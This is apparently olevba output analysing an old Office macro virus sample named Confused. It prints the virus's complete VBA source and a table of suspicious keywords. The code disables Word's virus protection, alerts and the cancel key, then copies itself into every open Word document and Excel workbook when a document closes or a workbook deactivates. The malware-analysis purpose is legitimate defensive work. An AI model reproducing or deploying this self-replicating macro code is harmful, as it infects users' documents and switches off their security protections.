olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused-ca7ed27842259751ddfcbf1e39c714dbf7cd10d5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Confused-ca7ed27842259751ddfcbf1e39c714dbf7cd10d5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused-ca7ed27842259751ddfcbf1e39c714dbf7cd10d5 - OLE stream: 'Macros/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused Memories
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Set £\ = ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule
£h = £ \ .CountOfLines + 1: £f = £ \ .Lines(1, £h)
Err.Clear: Set £o = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If £o.Find("~^^~", 0, 0, 0, 0, False, False) = False Then £h = £o.CountOfLines + 1: £o.InsertLines £h, £f
For £d = 1 To Documents.Count
If Documents(£d).VBProject.VBComponents(£\).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
£h = Documents(£d).VBProject.VBComponents(£\).CodeModule.CountOfLines + 1
Documents(£d).VBProject.VBComponents(£\).CodeModule.InsertLines £h, £f
End If: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Set £\ = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
£h = £ \ .CountOfLines + 1: £f = £ \ .Lines(1, £h)
Err.Clear: Set £o = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If £o.Find("~^^~", 0, 0, 0, 0, False, False) = False Then £h = £o.CountOfLines + 1: £o.InsertLines £h, £f
For £d = 1 To Workbooks.Count
If Workbooks(£d).VBProject.VBComponents(£\).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
£h = Workbooks(£d).VBProject.VBComponents(£\).CodeModule.CountOfLines + 1
Workbooks(£d).VBProject.VBComponents(£\).CodeModule.InsertLines £h, £f
End If: Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

